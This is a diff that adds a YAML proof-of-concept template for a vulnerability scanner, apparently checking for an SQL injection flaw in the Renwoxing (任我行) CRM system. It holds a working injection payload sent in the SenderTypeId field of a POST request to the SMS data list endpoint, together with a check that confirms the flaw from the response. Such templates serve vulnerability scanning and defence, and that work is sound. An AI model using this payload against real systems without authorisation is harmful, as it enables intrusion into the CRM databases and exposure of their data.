@@ -1,0 +1,19 @@
+id: poc-yaml-renwoxing-CRM-system-SQL-injection
+info:
+  name: 任我行CRM系统SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ASP.NET
+variables:
+  t1: random_int(1,100)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /SMS/SmsDataList/?pageIndex=1&pageSize=30
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and
+    1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{.t1}}')))) AND 'CvNI'='CvNI
+  expression: status_code == 200 && contains(body,t2)
+transport: http
